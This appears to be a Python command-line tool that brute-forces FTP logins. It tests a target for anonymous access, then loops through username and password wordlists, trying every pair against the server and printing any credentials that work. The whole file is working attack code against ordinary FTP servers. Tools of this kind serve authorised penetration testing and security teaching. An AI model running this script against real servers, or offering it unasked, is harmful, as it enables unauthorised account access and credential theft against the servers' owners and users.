import argparse
import sys
from ftplib import FTP
from colorama import Fore as F,Back as B,Style as S

def main():
    
    print(F.GREEN,end="")
    parser = argparse.ArgumentParser()
    parser.add_argument("-T",help="Target",type=str)
    parser.add_argument("-L",help="Usernames Wordlist",type=str)
    parser.add_argument("-P",help="Password Worlist",type=str)
    parser.add_argument("-V",help="Verbose Mode",action="store_true")
    parser.add_argument("-X",help="Loop Around Users",action="store_true")
    args=parser.parse_args()
    
    if(args.L and args.P and args.T):
        usernames=args.L
        passwords=args.P
        target=args.T
        verbose=args.V
        users_loop=args.X

    else:
        print("[-] Missing Parmeters Usage python3 ftp_bruteforce.py -h")
        sys.exit(0)
    
    print("[+] FTP Bruteforce with Python")
    print("[+] Target Server : "+target)
    print("[+] Usernames Wordlist : "+usernames)
    print("[+] Passwords Wordlist : "+passwords)
    
    if(verbose):
        print("[+] Verbose Mode : ON")
    else:
        print("[+] Verbose Mode : OFF")

    print("[*] Checking Anonymous Login ")
    
    anon_login(target)    

    bruteforce(target,usernames,passwords,users_loop,verbose)

def anon_login(target):
    
    try:
        ftp=FTP(target)
        ftp.login('anonymous','password')
        ftp.quit()
        print("[+] Anonymous Login Success Try Username : Anonymous and Password : Password")
    except :
        print("[-] Anonymous Login Failed")
        pass

def bruteforce(target,usernames,passwords,users_loop,verbose):

    print("[*] Bruteforcing User Credentials")
    
    if(users_loop):
        users_loop_bruteforce(target,usernames,passwords,verbose)
    else:
        normal_bruteforce(target,usernames,passwords,verbose)

def normal_bruteforce(target,usernames,passwords,verbose):
    try :
        with open(usernames) as u:
            for user in u:
                user=user.strip()
                try :
                    with open(passwords) as p:
                        for password in p:
                            password=password.strip()
                            ftp_login(target,user,password,verbose)        
                except :
                    print("[-] Invalid Passwords file")
                    sys.exit(0)
    except :
        print("[-] Invalid Usernames file ")
        sys.exit(0)

def users_loop_bruteforce(target,usernames,passwords,verbose):
    try :
        with open(passwords) as p:
            for password in p:
                password=password.strip()
                try :
                    with open(usernames) as u:
                        for user in u:
                            user=user.strip()
                            ftp_login(target,user,password,verbose)
                except :
                    print("[-] Invalid Usernames file")
                    sys.exit(0)
    except :
        print("[-] Invalid Passwords file ")
        sys.exit(0)

def ftp_login(target,user,password,verbose):
    if(verbose):
        print("[+] Trying Credentials "+user+":"+password)
    try:
        ftp=FTP(target)
        ftp.login(user,password)
        ftp.quit()
        print("[*] Found Valid Credentials "+user+":"+password)
    except :
        pass    
    
if __name__ == '__main__':
    main()

